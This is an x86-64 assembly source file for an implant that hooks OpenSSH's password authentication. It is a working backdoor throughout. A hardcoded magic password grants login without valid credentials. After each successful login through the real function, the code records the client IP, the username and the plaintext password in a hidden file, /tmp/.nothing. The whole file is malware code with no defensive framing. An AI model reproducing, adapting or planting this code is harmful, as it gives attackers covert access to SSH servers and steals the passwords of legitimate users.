%define sys_write 1
%define sys_open  2
%define sys_close 3

%define O_CLOEXEC 0x80000
%define O_APPEND    0x400
%define O_CREAT      0x40
%define O_RDWR        0x2

BITS 64

john_cena_jump:
	db 0xe9, 0x0, 0x0, 0x0, 0x0

check_magic_pass:
	lea rcx, [rel magic_pass]
	mov rdx, rsi

loop:
	mov al, [rdx]
	cmp al, [rcx]
	jne continue
	test al, al
	jz magic_pass_success
	inc rdx
	inc rcx
	jmp loop

magic_pass_success:
	mov al, 1
return: ret

continue:
;;; dirty trick to keep stack alignment
	push rdi
	push rdi
	push rsi

;;; call real auth_password function
	call john_cena_jump

	pop rsi
	pop rdi
	pop rdi

;;; test if authentication is valid
	test eax, eax
	jz return

;;; save parameters
	mov r8, rdi
	mov r9, rsi

;;; try open the file ---
	xor rsi, rsi
	mul rsi
	mov al, sys_open
	lea rdi, [rel logfile]
	mov esi, O_CLOEXEC | O_APPEND | O_CREAT | O_RDWR
	mov dx, 0644
	syscall

;;; check if the file is opened successfully
	test rax, rax
	js magic_pass_success

;;; restore parameters
	mov rdi, r8
	mov rsi, r9

;;; magic
	lea r8, [rsp-8]

	; offsetof(struct ssh, remote_ipaddr)
	lea rcx, [rdi+16]
	mov rcx, [rcx]
	call stack_copy

	; offsetof(struct ssh, authctxt);
	lea rcx, [rdi+0x860]
	mov rcx, [rcx]

	; offsetof(struct Authctxt, user);
	lea rcx, [rcx+0x20]
	mov rcx, [rcx]
	call stack_copy

	; password
	mov rcx, rsi
	call stack_copy

;;; end of magic

	mov rdi, rax
	xor rax, rax
	mov al, sys_write
	mov rsi, r8
	lea rdx, [rsp-8]
	sub rdx, r8
	syscall

	xor rax, rax
	mov al, sys_close
	syscall

	inc eax

	ret

; copy rcx to stack
stack_copy:
	xchg rsp, r8
	myloop:
	dec rsp
	mov dl, [rcx]
	mov [rsp], dl
	inc rcx
	test dl, dl
	jnz myloop
	xchg rsp, r8
	ret

magic_pass: db 'anneeeeeeeeeeee', 0x0
logfile: db '/tmp/.nothing', 0x0
